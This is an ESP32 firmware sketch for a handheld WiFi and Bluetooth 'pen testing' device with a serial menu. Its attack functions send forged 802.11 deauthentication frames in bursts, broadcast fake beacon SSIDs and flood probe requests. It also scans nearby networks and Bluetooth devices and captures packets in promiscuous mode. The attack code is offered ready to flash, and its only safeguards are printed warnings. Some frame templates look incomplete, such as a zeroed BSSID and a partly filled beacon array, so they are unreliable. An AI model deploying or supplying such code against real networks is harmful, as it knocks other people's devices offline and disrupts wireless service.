/*
 * TechBot4 - ESP32 Marauder Pen Testing Device
 * WiFi and Bluetooth Security Testing Tool
 * 
 * Features:
 * - WiFi Network Scanning
 * - Deauth Attack
 * - Beacon Spam
 * - Probe Request Sniffing
 * - Bluetooth Scanning
 * - Packet Monitor
 */

#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <BLEDevice.h>
#include <BLEScan.h>

// Pin Definitions for Custom PCB
#define BUTTON_SELECT 34
#define BUTTON_UP 35
#define BUTTON_DOWN 32
#define BUTTON_BACK 33
#define LED_STATUS 2
#define BUZZER_PIN 25

// Display pins (I2C OLED)
#define OLED_SDA 21
#define OLED_SCL 22

// Menu states
enum MenuState {
  MENU_MAIN,
  MENU_WIFI_SCAN,
  MENU_WIFI_ATTACK,
  MENU_BLE_SCAN,
  MENU_PACKET_MONITOR,
  MENU_SETTINGS
};

MenuState currentMenu = MENU_MAIN;
int menuSelection = 0;
bool attackRunning = false;

// WiFi scan results
int networkCount = 0;
String networks[50];
int rssiValues[50];
uint8_t channels[50];

// Attack parameters
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xF0, 0xFF, 0x02, 0x00
};

// Beacon frame template
uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0xC0, 0x6C,
  0x83, 0x51, 0xF7, 0x8F, 0x0F, 0x00, 0x00, 0x00,
  0x64, 0x00,
  0x01, 0x04,
  0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
  0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
  0x03, 0x01, 0x04
};

void setup() {
  Serial.begin(115200);
  
  // Initialize pins
  pinMode(BUTTON_SELECT, INPUT_PULLUP);
  pinMode(BUTTON_UP, INPUT_PULLUP);
  pinMode(BUTTON_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_BACK, INPUT_PULLUP);
  pinMode(LED_STATUS, OUTPUT);
  pinMode(BUZZER_PIN, OUTPUT);
  
  // Startup sequence
  digitalWrite(LED_STATUS, HIGH);
  tone(BUZZER_PIN, 1000, 100);
  delay(200);
  digitalWrite(LED_STATUS, LOW);
  
  Serial.println("TechBot4 Marauder Starting...");
  Serial.println("ESP32 Pen Testing Device");
  Serial.println("================================");
  
  // Initialize WiFi in promiscuous mode
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_promiscuous(true);
  
  Serial.println("System Ready!");
  displayMainMenu();
}

void loop() {
  handleButtons();
  
  switch(currentMenu) {
    case MENU_WIFI_SCAN:
      performWiFiScan();
      break;
    case MENU_WIFI_ATTACK:
      handleWiFiAttack();
      break;
    case MENU_BLE_SCAN:
      performBLEScan();
      break;
    case MENU_PACKET_MONITOR:
      monitorPackets();
      break;
    default:
      break;
  }
  
  delay(10);
}

void handleButtons() {
  static unsigned long lastPress = 0;
  unsigned long currentTime = millis();
  
  if (currentTime - lastPress < 200) return; // Debounce
  
  if (digitalRead(BUTTON_UP) == LOW) {
    menuSelection--;
    if (menuSelection < 0) menuSelection = 0;
    lastPress = currentTime;
    tone(BUZZER_PIN, 2000, 50);
    updateDisplay();
  }
  
  if (digitalRead(BUTTON_DOWN) == LOW) {
    menuSelection++;
    lastPress = currentTime;
    tone(BUZZER_PIN, 2000, 50);
    updateDisplay();
  }
  
  if (digitalRead(BUTTON_SELECT) == LOW) {
    handleSelection();
    lastPress = currentTime;
    tone(BUZZER_PIN, 3000, 100);
  }
  
  if (digitalRead(BUTTON_BACK) == LOW) {
    goBack();
    lastPress = currentTime;
    tone(BUZZER_PIN, 1500, 100);
  }
}

void displayMainMenu() {
  Serial.println("\n=== MAIN MENU ===");
  Serial.println("1. WiFi Scanner");
  Serial.println("2. WiFi Attacks");
  Serial.println("3. Bluetooth Scanner");
  Serial.println("4. Packet Monitor");
  Serial.println("5. Settings");
}

void handleSelection() {
  switch(currentMenu) {
    case MENU_MAIN:
      switch(menuSelection) {
        case 0:
          currentMenu = MENU_WIFI_SCAN;
          Serial.println("\n>>> WiFi Scanner Selected");
          break;
        case 1:
          currentMenu = MENU_WIFI_ATTACK;
          Serial.println("\n>>> WiFi Attacks Selected");
          displayAttackMenu();
          break;
        case 2:
          currentMenu = MENU_BLE_SCAN;
          Serial.println("\n>>> Bluetooth Scanner Selected");
          break;
        case 3:
          currentMenu = MENU_PACKET_MONITOR;
          Serial.println("\n>>> Packet Monitor Selected");
          break;
        case 4:
          currentMenu = MENU_SETTINGS;
          Serial.println("\n>>> Settings Selected");
          break;
      }
      menuSelection = 0;
      break;
  }
}

void goBack() {
  attackRunning = false;
  currentMenu = MENU_MAIN;
  menuSelection = 0;
  displayMainMenu();
}

void updateDisplay() {
  // Placeholder for OLED update
  // In production, this would update the OLED display
  Serial.print("Selection: ");
  Serial.println(menuSelection);
}

void performWiFiScan() {
  static unsigned long lastScan = 0;
  
  if (millis() - lastScan < 5000) return; // Scan every 5 seconds
  
  Serial.println("\n[*] Scanning for WiFi networks...");
  digitalWrite(LED_STATUS, HIGH);
  
  networkCount = WiFi.scanNetworks();
  
  Serial.println("\n=== WiFi Networks Found ===");
  Serial.printf("Total: %d networks\n\n", networkCount);
  
  for (int i = 0; i < networkCount && i < 50; i++) {
    networks[i] = WiFi.SSID(i);
    rssiValues[i] = WiFi.RSSI(i);
    channels[i] = WiFi.channel(i);
    
    Serial.printf("%2d: %-32s | RSSI: %4d dBm | Ch: %2d | %s\n",
                  i + 1,
                  networks[i].c_str(),
                  rssiValues[i],
                  channels[i],
                  WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "OPEN" : "SECURED");
  }
  
  digitalWrite(LED_STATUS, LOW);
  lastScan = millis();
  Serial.println("\n[✓] Scan complete. Press BACK to return.");
}

void displayAttackMenu() {
  Serial.println("\n=== WiFi ATTACKS ===");
  Serial.println("1. Deauth Attack");
  Serial.println("2. Beacon Spam");
  Serial.println("3. Probe Request Flood");
  Serial.println("WARNING: Use only on networks you own!");
}

void handleWiFiAttack() {
  if (!attackRunning && digitalRead(BUTTON_SELECT) == LOW) {
    attackRunning = true;
    
    switch(menuSelection) {
      case 0:
        performDeauthAttack();
        break;
      case 1:
        performBeaconSpam();
        break;
      case 2:
        performProbeFlood();
        break;
    }
  }
}

void performDeauthAttack() {
  Serial.println("\n[!] Starting Deauth Attack...");
  Serial.println("[!] WARNING: Educational purposes only!");
  
  digitalWrite(LED_STATUS, HIGH);
  
  for (int i = 0; i < 100 && attackRunning; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delayMicroseconds(100);
    
    if (i % 10 == 0) {
      Serial.print(".");
    }
  }
  
  digitalWrite(LED_STATUS, LOW);
  Serial.println("\n[✓] Attack cycle complete");
  attackRunning = false;
}

void performBeaconSpam() {
  Serial.println("\n[!] Starting Beacon Spam...");
  
  String ssids[] = {"FREE_WIFI", "FBI_Surveillance_Van", "Virus.exe", 
                    "HackTheGibson", "Pwned", "YourWiFiIsWeak"};
  
  digitalWrite(LED_STATUS, HIGH);
  
  for (int i = 0; i < 50 && attackRunning; i++) {
    String ssid = ssids[random(0, 6)];
    
    // Update SSID in beacon packet
    int ssidLen = ssid.length();
    beaconPacket[37] = ssidLen;
    
    for (int j = 0; j < ssidLen; j++) {
      beaconPacket[38 + j] = ssid[j];
    }
    
    esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
    delay(100);
    
    Serial.print(".");
    if (i % 10 == 0) Serial.println();
  }
  
  digitalWrite(LED_STATUS, LOW);
  Serial.println("\n[✓] Beacon spam complete");
  attackRunning = false;
}

void performProbeFlood() {
  Serial.println("\n[!] Starting Probe Request Flood...");
  digitalWrite(LED_STATUS, HIGH);
  
  for (int i = 0; i < 100 && attackRunning; i++) {
    // Send random probe requests
    WiFi.scanNetworks(true);
    delay(50);
    Serial.print(".");
    if (i % 10 == 0) Serial.println();
  }
  
  digitalWrite(LED_STATUS, LOW);
  Serial.println("\n[✓] Probe flood complete");
  attackRunning = false;
}

void performBLEScan() {
  static bool scanInitialized = false;
  static unsigned long lastScan = 0;
  
  if (!scanInitialized) {
    Serial.println("\n[*] Initializing Bluetooth...");
    BLEDevice::init("TechBot4");
    scanInitialized = true;
  }
  
  if (millis() - lastScan < 5000) return;
  
  Serial.println("\n[*] Scanning for Bluetooth devices...");
  digitalWrite(LED_STATUS, HIGH);
  
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  BLEScanResults foundDevices = pBLEScan->start(3, false);
  
  Serial.println("\n=== Bluetooth Devices Found ===");
  Serial.printf("Total: %d devices\n\n", foundDevices.getCount());
  
  for (int i = 0; i < foundDevices.getCount(); i++) {
    BLEAdvertisedDevice device = foundDevices.getDevice(i);
    Serial.printf("%2d: %s | RSSI: %d dBm\n",
                  i + 1,
                  device.getAddress().toString().c_str(),
                  device.getRSSI());
    
    if (device.haveName()) {
      Serial.printf("    Name: %s\n", device.getName().c_str());
    }
  }
  
  digitalWrite(LED_STATUS, LOW);
  lastScan = millis();
  Serial.println("\n[✓] Scan complete. Press BACK to return.");
}

void monitorPackets() {
  static bool monitoring = false;
  
  if (!monitoring) {
    Serial.println("\n[*] Starting packet monitor...");
    Serial.println("[*] Capturing WiFi packets...");
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&packetHandler);
    monitoring = true;
  }
  
  // Monitoring happens in callback
  delay(100);
}

void packetHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
  static unsigned long packetCount = 0;
  packetCount++;
  
  if (packetCount % 100 == 0) {
    Serial.printf("[*] Packets captured: %lu\n", packetCount);
    digitalWrite(LED_STATUS, !digitalRead(LED_STATUS));
  }
}
